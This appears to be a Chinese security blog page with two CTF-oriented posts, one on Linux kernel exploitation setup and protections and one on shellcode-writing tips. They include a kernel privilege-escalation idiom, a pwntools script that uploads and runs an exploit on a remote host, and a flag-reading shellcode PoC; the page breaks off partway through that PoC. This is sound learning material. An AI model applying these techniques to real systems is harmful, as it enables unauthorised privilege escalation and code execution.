          <p>开始步入linux内核的学习。打算实践为主导，先自己搭一个内核调试的环境，并在过程中学习遇到的相关知识</p>
<h2 id="内核态与用户态的分割"><a href="#内核态与用户态的分割" class="headerlink" title="内核态与用户态的分割"></a>内核态与用户态的分割</h2><ul>
<li>安全性的考虑：用户态中恶意程序无法执行特权指令，破坏系统。其中内核态空间用户态应用无权访问。</li>
<li>稳定性的保障：用户态中程序发生错误并不会导致内核的运作发生错误而影响整个系统的稳定性</li>
<li>抽象化硬件调度操作：内核为用户态实现<strong>统一的设备访问接口</strong>（系统调用），用户程序无需关注不同设备的交互细节</li>
</ul>
<p>在用户态程序中，通常利用read等系统调用后就能实现对应的写内存等操作，其中的实现细节便是在内核态中完成的。</p>
<h2 id="编译运行一个linux内核"><a href="#编译运行一个linux内核" class="headerlink" title="编译运行一个linux内核"></a>编译运行一个linux内核</h2><p>网上很多相关的步骤，算是步入内核大门的第一步。这里详细记录一下本人通过这个实践的收获：</p>
<h3 id="忽略内核模块签名验证"><a href="#忽略内核模块签名验证" class="headerlink" title="忽略内核模块签名验证"></a>忽略内核模块签名验证</h3><blockquote>
<p> <em><strong>Linux内核从3.7版本开始引入了模块签名验证机制。开启后，内核在加载模块时会使用内置的公钥对模块的签名进行校验，以确保模块的完整性和来源可信。这对于安全至关重要，但在开发和编译阶段，它可能会带来不便，因为默认情况下，内核会尝试使用自己编译过程中生成的一套密钥来签名模块。</strong></em></p>
</blockquote>
<p>因为后面会利用该内核编译一些自己写的内核模块，所以在编译之前需要禁用相应选项。</p>
<h3 id="内核镜像与磁盘镜像"><a href="#内核镜像与磁盘镜像" class="headerlink" title="内核镜像与磁盘镜像"></a>内核镜像与磁盘镜像</h3><p>在实验中我分别下载linux内核文件以及busybox分别编译，最终获得下述两个文件:<code>bzImage</code>与<code>rootfs.img</code></p>
<h4 id="bzImage"><a href="#bzImage" class="headerlink" title="bzImage"></a>bzImage</h4><ul>
<li><code>bzImage</code> 的意思是 “big zImage”，是经过压缩的Linux内核二进制文件</li>
<li>它包含了Linux内核的所有代码：进程调度、内存管理、设备驱动、文件系统支持、网络协议栈等</li>
</ul>
<h4 id="rootfs-img"><a href="#rootfs-img" class="headerlink" title="rootfs.img"></a>rootfs.img</h4><ul>
<li>一个包含了完整Linux系统<strong>目录结构</strong>和<strong>必要文件</strong>的磁盘映像。</li>
<li>由BusyBox等工具制作，包含了Shell、核心工具（<code>ls</code>, <code>cp</code>, <code>mkdir</code>等）、库文件、配置文件和初始化脚本</li>
</ul>
<h4 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h4><p>+———————————+<br>          BIOS&#x2F;UEFI                  ← 硬件启动<br>+———————————+<br>           ↓<br>+———————————+<br>         Bootloader (GRUB)            ← 加载 bzImage 到内存<br>+———————————+<br>           ↓<br>+———————————+<br>       Linux Kernel (bzImage)        ← 解压、初始化硬件、驱动<br>+———————————+<br>           ↓ (通过内核参数指定 rootfs)<br>+———————————+<br>      挂载根文件系统 (rootfs.img)      ← 从磁盘&#x2F;内存&#x2F;网络找到 rootfs<br>+———————————+<br>           ↓<br>+———————————+<br>     执行 &#x2F;init 或 &#x2F;sbin&#x2F;init       ← 第一个用户空间进程 (PID 1)<br>+———————————+<br>           ↓<br>+———————————+<br>         Shell 或系统服务             ← 完整的用户空间环境<br>+———————————+</p>
<blockquote>
<p>挂载：一开始的内核只有临时的目录结构，真正健全的目录系统rootfs.img还在磁盘上，挂载能够<strong>将存储设备上的文件系统关联到目录树的某个位置，使得内核可以通过文件路径访问存储设备的内容</strong>，内核系统能够正常启动离不开若干次成功的挂载。</p>
</blockquote>
<h2 id="编译一个简单内核模块"><a href="#编译一个简单内核模块" class="headerlink" title="编译一个简单内核模块"></a>编译一个简单内核模块</h2><p><em>Linux Kernel 采用的是宏内核架构，一切的系统服务都需要由内核来提供，虽然效率较高，但是缺乏可扩展性与可维护性，同时内核需要装载很多可能用到的服务，但这些服务最终可能未必会用到，还会占据大量内存空间，同时新服务的提供往往意味着要重新编译整个内核。</em>——&gt;，<strong>可装载内核模块</strong>（Loadable Kernel Modules）应运而生， LKMs 可以像积木一样被装载入内核 &#x2F; 从内核中卸载，大大提高了 kernel 的可拓展性与可维护性。</p>
<p>常见的 LKMs 包括：</p>
<ul>
<li>驱动程序（Device drivers）<ul>
<li>设备驱动</li>
<li>文件系统驱动</li>
<li>各种驱动…</li>
</ul>
</li>
<li>内核扩展模块 (modules)</li>
</ul>
<p>内核模块的文件后缀是.ko       </p>
<p>一般用c实现内核模块的编写，通过同目录下的Kbuild文件以及Makefile实现编译操作。便可以在系统中使用insmod载入模块，rfmod卸载模块。</p>
<p><img src="/2025/11/03/linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png"></p>
<blockquote>
<p>当在内核模块能够控制到函数的rip(程序执行流)，就能够通过某些方法实现提权一般来说躲不开两个函数：<code>commit_creds_kfunc(prepare_kernel_cred_kfunc(0))</code>这两个函数配合的效果会将当前进程变成0环，从而实现提取。同时要注意内核态要正确过渡到用户态我们才能自由利用提权成果</p>
</blockquote>
<p><em><strong>注意内核模块的逻辑运行环境是内核态，这其中有许多机制与用户态不同，这也是后续我需要学习的内容。</strong></em></p>
<h3 id="内核模块与用户交互机制"><a href="#内核模块与用户交互机制" class="headerlink" title="内核模块与用户交互机制"></a>内核模块与用户交互机制</h3><p>用户与内核模块程序交互相对于用户态程序较为麻烦，存在多种方式：</p>
<ul>
<li><strong>&#x2F;proc ，&#x2F;sys文件系统</strong></li>
<li><strong>ioctl 命令</strong></li>
<li><strong>netlink 套接字</strong></li>
<li>注册系统调用&#x2F;中断</li>
</ul>
<p>与破解内核模块的第一步就是搞清楚它实现的与用户交互的机制从而正确测试各项功能，这里有篇文章详细地解释并实现了各种交互方式：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/adam-ma/p/18084237">https://www.cnblogs.com/adam-ma/p/18084237</a></p>
<h4 id="file-operations结构体"><a href="#file-operations结构体" class="headerlink" title="file_operations结构体"></a>file_operations结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_device_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,							<span class="comment">//指向拥有者</span></span><br><span class="line">    .open = my_device_open,							<span class="comment">//处理打开操作</span></span><br><span class="line">    .release = my_device_release,			<span class="comment">//处理close操作</span></span><br><span class="line">    .read = my_device_read,           <span class="comment">// 处理读取操作</span></span><br><span class="line">    .write = my_device_write,         <span class="comment">// 处理写入操作  </span></span><br><span class="line">    .unlocked_ioctl = my_device_ioctl,<span class="comment">// 处理控制命令</span></span><br><span class="line">    .llseek = my_device_llseek,       <span class="comment">// 处理文件定位</span></span><br><span class="line">&#125;; <span class="comment">//这里只展示了常见的操作</span></span><br></pre></td></tr></table></figure>



<h4 id="cdev-字符设备对象"><a href="#cdev-字符设备对象" class="headerlink" title="cdev - 字符设备对象"></a>cdev - 字符设备对象</h4><p>代表内核中的一个<strong>字符设备实例</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>              <span class="comment">// 内嵌的kobject，用于设备模型</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>             <span class="comment">// 指向拥有此设备的模块</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span> <span class="comment">// 文件操作函数集</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>            <span class="comment">// 连接到cdev_map的链表</span></span><br><span class="line">    <span class="type">dev_t</span> dev;                        <span class="comment">// 设备号（主设备号 + 次设备号）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;               <span class="comment">// 设备数量（次设备号范围）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="字符串设备init常见流程"><a href="#字符串设备init常见流程" class="headerlink" title="字符串设备init常见流程"></a>字符串设备init常见流程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">dev_t</span> devno = MKDEV(DEVICE_MAJOR, DEVICE_MINOR);   <span class="comment">//构造设备号</span></span><br><span class="line">register_chrdev_region(devno, <span class="number">1</span>, DEVICE_NAME);   <span class="comment">//向内核“登记”设备号区间</span></span><br><span class="line">cdev_init(&amp;my_device_cdev, &amp;my_device_fops);  <span class="comment">//初始化字符设备对象，并赋予文件操作指针</span></span><br><span class="line">my_device_cdev.owner = THIS_MODULE;    <span class="comment">//指定模块所有者</span></span><br><span class="line">cdev_add(&amp;my_device_cdev, devno, <span class="number">1</span>); <span class="comment">//把字符设备正式放进内核</span></span><br><span class="line">char_class = class_create(THIS_MODULE, CLASS_NAME);  <span class="comment">//创建设备类</span></span><br><span class="line">char_device = device_create(char_class, <span class="literal">NULL</span>, devno, <span class="literal">NULL</span>, DEVICE_NAME); <span class="comment">//创建设备文件</span></span><br></pre></td></tr></table></figure>



<p>对于dev&#x2F;DEVICE_NAME文件的操作会映射成内核模块的操作</p>
<h2 id="如何pwn？"><a href="#如何pwn？" class="headerlink" title="如何pwn？"></a>如何pwn？</h2><p>一般来说题目会给一个bzImage对应编译好的内核镜像，roofts.img对应着文件系统的镜像，并给一个启动脚本，利用启动脚本能够qemu启动内核，在启动脚本中加入-g方便gdb调试。exp的形式一般是用c语言编译成elf文件，在题目给定的内核环境中与有漏洞的ko内核模块进行交互实现提权的操作。</p>
<h4 id="本地打法："><a href="#本地打法：" class="headerlink" title="本地打法："></a>本地打法：</h4><p>构造sh文件编译exp并整合到rootfs.img文件镜像中，shell脚本如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译 exploit</span></span><br><span class="line">echo &quot;[*] Compiling exploit...&quot;</span><br><span class="line">gcc exp.c -static -masm=intel -g -o exploit || &#123;</span><br><span class="line">    echo &quot;[-] Compilation failed!&quot;</span><br><span class="line">    exit 1</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打包文件系统</span></span><br><span class="line">echo &quot;[*] Creating rootfs.cpio...&quot;</span><br><span class="line">sudo bash -c &quot;find . | cpio -o --format=newc &gt; ../rootfs.cpio&quot; || &#123;</span><br><span class="line">    echo &quot;[-] Failed to create cpio archive!&quot;</span><br><span class="line">    exit 1</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回上级目录</span></span><br><span class="line">cd ..</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动内核</span></span><br><span class="line">echo &quot;[*] Launching kernel...&quot;</span><br><span class="line">sudo ./start.sh</span><br></pre></td></tr></table></figure>

<h4 id="远程打法："><a href="#远程打法：" class="headerlink" title="远程打法："></a>远程打法：</h4><p>将攻击程序传输到远程中并运行，这时会出现攻击可执行文件过大的问题(因为是静态编译)，比较通用的解决方法是将 exploit 进行 base64 编码后传输。python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">11451</span>)  <span class="comment">#连接远程地址</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./run.sh&#x27;)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        log.info(<span class="string">&quot;count: &quot;</span> + <span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x /tmp/exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;/tmp/exploit &quot;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="常见保护机制"><a href="#常见保护机制" class="headerlink" title="常见保护机制"></a>常见保护机制</h2><h3 id="KASLR-保护"><a href="#KASLR-保护" class="headerlink" title="KASLR 保护"></a>KASLR 保护</h3><p>KASLR（Kernel Address Space Layout Randomization）是一种用于保护操作系统内核的安全技术。它通过在系统启动时随机化内核地址空间的布局来防止攻击者确定内核中的精确地址</p>
<blockquote>
<p>值得注意的是随机方式是通过<code>函数基地址 +随机值=内存运行地址</code>方式来随机化 </p>
<p>本质上与用户态的aslr绕过思路相近，通过泄露地址活的基址</p>
</blockquote>
<p>这里贴出实现的原理：</p>
<ol>
<li><p><strong>引导阶段</strong>：</p>
<ul>
<li>引导加载程序在将内核镜像加载到内存时，会选择一个随机的物理地址偏移。</li>
<li>这个偏移量通常被称为“KASLR偏移”。</li>
</ul>
</li>
<li><p><strong>内核重定位</strong>：</p>
<ul>
<li>内核启动早期，在建立页表之前，会应用这个随机偏移。</li>
<li>内核需要具备<strong>位置无关</strong>或<strong>可重定位</strong>的能力，能够正确处理自身地址的变动。这意味着内核在编译时需要使用<code>-fPIC</code>等选项，并且内部的<strong>重定位表</strong>需要被正确处理。</li>
<li>最终，内核的虚拟地址（在x86_64上，通常是<code>0xffffffff80000000</code>开始的-2GB空间）也会被加上这个随机偏移。</li>
</ul>
<blockquote>
<p>这里的重定位表和PE&#x2F;ELF文件中的并无差别！</p>
</blockquote>
</li>
</ol>
<h3 id="SMEP-SMAP保护"><a href="#SMEP-SMAP保护" class="headerlink" title="SMEP&amp;SMAP保护"></a>SMEP&amp;SMAP保护</h3><p>通过在CR4寄存器中定位其中两个bit位，代表内核是否开启保护</p>
<ul>
<li>SMEP：控制内核态不能执行用户态的shellcode</li>
<li>SMAP：控制用户态空间的指针不能被内核态解引用，即不能访问内核空间中的敏感信息</li>
</ul>
<blockquote>
<p>CR4控制了CPU的<strong>工作模式和安全特性</strong>，内核统一管理所有CPU的CR4（策略保持一致）</p>
</blockquote>
<p><img src="/2025/11/03/linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png"></p>
<h3 id="KPTI保护"><a href="#KPTI保护" class="headerlink" title="KPTI保护"></a>KPTI保护</h3><p>kernel page-table isolation(内核页表隔离),通过完全分离用户空间与内核空间页表来解决页表泄露。</p>
<p>一旦开启了 KPTI,由于内核态和用户态的页表不同，所以如果使用 ret2user或内核执行 ROP返回用户态时，由于内核态无法确定用户态的页表，就会报出一个段错误。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/30/shellcode-tips/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/30/shellcode-tips/" class="post-title-link" itemprop="url">shellcode_tips(持续更新版)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-30 16:37:07" itemprop="dateCreated datePublished" datetime="2025-10-30T16:37:07+08:00">2025-10-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-11-19 11:24:55" itemprop="dateModified" datetime="2025-11-19T11:24:55+08:00">2025-11-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="本帖将持续记录Linux下shellcode的一些编写技巧，包括长度的优化，特定限制的绕过，shellcode的绕过"><a href="#本帖将持续记录Linux下shellcode的一些编写技巧，包括长度的优化，特定限制的绕过，shellcode的绕过" class="headerlink" title="本帖将持续记录Linux下shellcode的一些编写技巧，包括长度的优化，特定限制的绕过，shellcode的绕过"></a>本帖将持续记录Linux下shellcode的一些编写技巧，包括长度的优化，特定限制的绕过，shellcode的绕过</h2><blockquote>
<p>鉴于本人汇编基础较弱，目前在持续学习中，如有不正确或含糊的表述，欢迎联系我与我讨论！</p>
</blockquote>
<p>Shellcode的编写在二进制安全中是不可避免的，当回归到汇编这种较为底层的语言去实现一些特定功能时，我们往往会发现不只有一种方法能够实现我们的目的。这里我就拿64位中实现 <code>read(0,0x404000,0x50)</code>来举例子：</p>
<p>1.最直接的传值syscall</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rax, 0          ; sys_read 系统调用号</span><br><span class="line">    mov rdi, 0          ; fd = 0 (stdin)</span><br><span class="line">    mov rsi, 0x404000   ; buf = 0x404000</span><br><span class="line">    mov rdx, 0x50       ; count = 0x50</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>2.利用栈传值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    push 0x50           ; count</span><br><span class="line">    push 0x404000       ; buf</span><br><span class="line">    push 0              ; fd</span><br><span class="line">    </span><br><span class="line">    pop rdi             ; fd</span><br><span class="line">    pop rsi             ; buf</span><br><span class="line">    pop rdx             ; count</span><br><span class="line">    </span><br><span class="line">    mov rax, 0          ; sys_read</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>3.切换到32位操作模式，用中断门调用read操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">[bits 64]</span><br><span class="line">_start:</span><br><span class="line">    ; 直接使用远返回到32位模式</span><br><span class="line">    push 0x2b           ; 32位CS</span><br><span class="line">    push code32         ; 32位EIP</span><br><span class="line">    retfq               ; 远返回</span><br><span class="line"></span><br><span class="line">[bits 32]</span><br><span class="line">code32:</span><br><span class="line">    ; 手动设置32位栈</span><br><span class="line">    mov esp, 0x7fffe000</span><br><span class="line">    </span><br><span class="line">    ; 32位系统调用</span><br><span class="line">    mov eax, 3          ; sys_read</span><br><span class="line">    mov ebx, 0          ; stdin</span><br><span class="line">    mov ecx, 0x404000   ; buffer</span><br><span class="line">    mov edx, 0x50       ; size</span><br><span class="line">    int 0x80</span><br><span class="line">    </span><br><span class="line">    mov eax, 1          ; sys_exit</span><br><span class="line">    mov ebx, 0</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>

<p>可以看到汇编的灵活性是非常大的，当然在实战中对于shellcode的编写往往存在着各种各样的限制，比如长度有限，shellcode分割，沙箱保护，特定字符检测等等。通过汇编的灵活性，在某些情况下能够绕过重重难关从而达到我们的目的。</p>
<h3 id="优化shellcode的长度"><a href="#优化shellcode的长度" class="headerlink" title="优化shellcode的长度"></a>优化shellcode的长度</h3><p>列一下常见的64位指令长度</p>
<h6 id="栈的操作"><a href="#栈的操作" class="headerlink" title="栈的操作"></a>栈的操作</h6><ul>
<li>pop&#x2F;push reg 1字节</li>
<li>push imm 1+立即数的字节数(1&#x2F;2&#x2F;4)</li>
</ul>
<h6 id="赋值-计算操作"><a href="#赋值-计算操作" class="headerlink" title="赋值&#x2F;计算操作"></a>赋值&#x2F;计算操作</h6><ul>
<li>Inc&#x2F;dec reg 字节</li>
<li>mov&#x2F;add reg64，reg64     2字节</li>
<li>mov&#x2F;add reg, [reg]             3字节</li>
<li>mov&#x2F;add reg, imm32          5字节</li>
<li>mov&#x2F;add reg64, imm32      7字节</li>
<li>mov&#x2F;add reg64, imm64      10字节</li>
</ul>
<h6 id="程序流"><a href="#程序流" class="headerlink" title="程序流"></a>程序流</h6><ul>
<li>ret  1字节</li>
<li>syscall 2字节</li>
<li>jmp等跳转 short 2字节</li>
<li>jmp&#x2F;call rel32  5字节</li>
</ul>
<p>经过对比栈操作与赋值的指令，发现当使用 <code>push imm</code> + <code>pop reg</code> 替代 &#96;mov reg, imm会使汇编更加精简。同时在jmp到shellcode前的上下文也是我们需要观察的，对于栈，寄存器上的数据没准我们就能利用上来减少shellcode的长度。</p>
<h4 id="Xctf-Nctf-only"><a href="#Xctf-Nctf-only" class="headerlink" title="Xctf-Nctf only"></a>Xctf-Nctf only</h4><p>题目给了0xa大小的shellcode执行，shellcode用mmap分配，寄存器在执行shellcode前清0。这里考虑用栈上数据，我一开始想跳到读取shellcode的read处，通过修改rdx为一个很大的值来达成任意长度的shellcode写。<code>base_shellcode=asm(&#39;&#39;&#39; pop rdx ;操作返回地址来修改跳转位置 mov rax,[rbp-0x10] ；确保read的buf为shellcode地址 sub dl,0x18                     jmp rdx                  &#39;&#39;&#39;)</code></p>
<p>(因为read的长度太大，与rdi相加后超过0x7fffffff的用户空间会报错)远程没通。wing师傅的shellcode相比之下更加巧妙：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">asm(&quot;&quot;&quot;</span><br><span class="line">        call pop ;将rip放到栈上</span><br><span class="line">    pop:</span><br><span class="line">        pop rsi ;buf</span><br><span class="line">        mov dl, 0x68 ;len</span><br><span class="line">        syscall ;rax,rdi已经置0，实现read(0,rip,0x68)</span><br><span class="line">    tag:</span><br><span class="line">        &quot;&quot;&quot;)</span><br></pre></td></tr></table></figure>



<h3 id="shellcode分块"><a href="#shellcode分块" class="headerlink" title="shellcode分块"></a>shellcode分块</h3><p>有些情景下我们不具备写入连续内容的能力，那么需要将我们写入的shellcode<code>拼凑</code>到一起从而形成一段完整的执行链。这里需要用到相对跳转，也就是<code>jmp $+0x8</code>：这段汇编的意思为跳转到当前eip+0x8的地址上去执行，其汇编拆解便是EB 08</p>
<ul>
<li><code>EB</code>: 短跳转操作码</li>
<li><code>08</code>: 相对偏移量（从下条指令开始计算）</li>
</ul>
<p>在知道对应内存块的相对位移的情况下(通常来说只要位于同一内存段偏移一般固定)在每个内存块尾部加上这么一条相对跳转指令即可</p>
<p>题目试例：</p>
<p>西电mini的checkin题</p>
<p>题目的大致执行流程是向三块堆空间中分别读取0x18数据，然后将堆空间变成可执行的，并跳到第一个堆块空间，题目开了沙箱ban掉execve系统调用。</p>
<p><img src="/2025/10/30/shellcode-tips/1.png"></p>
<p>非常直球的题目，要在三段堆空间构造orw的shellcode。动调查看三个堆块之间的相对偏移（这个是固定的），在每一段shellcode末尾加上jmp $x即可</p>
<p>poc脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gdb&#x27;</span>,<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;16296&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc_open=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f</span></span><br><span class="line"><span class="string">    push rax /* &#x27;/flag&#x27; */</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span 